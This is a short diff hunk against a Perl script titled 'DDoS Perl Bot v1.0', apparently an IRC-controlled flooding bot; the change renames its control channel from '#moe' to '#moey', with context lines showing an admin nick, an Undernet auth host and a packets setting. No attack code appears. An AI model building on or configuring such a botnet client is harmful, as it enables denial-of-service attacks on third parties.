@@ -144,7 +144,7 @@ my $version = 'DDoS Perl Bot v1.0';
  
 my @admins = ("lilmoe");
 my @hostauth = ("lilmoe.users.undernet.org");
-my @channels = ("#moe");
+my @channels = ("#moey");
  
 my $pacotes = 1;
  
